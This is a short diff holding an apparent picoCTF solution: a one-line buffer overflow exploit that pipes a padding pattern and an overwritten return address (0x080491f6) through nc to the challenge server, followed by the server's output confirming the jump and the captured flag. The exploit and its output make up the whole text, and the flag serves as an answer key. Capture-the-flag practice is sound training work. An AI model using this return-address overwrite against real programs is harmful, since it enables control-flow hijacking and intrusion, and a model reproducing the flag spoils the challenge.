@@ -1,0 +1,4 @@
+(echo -ne 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08\n'; cat -) | nc saturn.picoctf.net 52950
+Please enter your string:
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
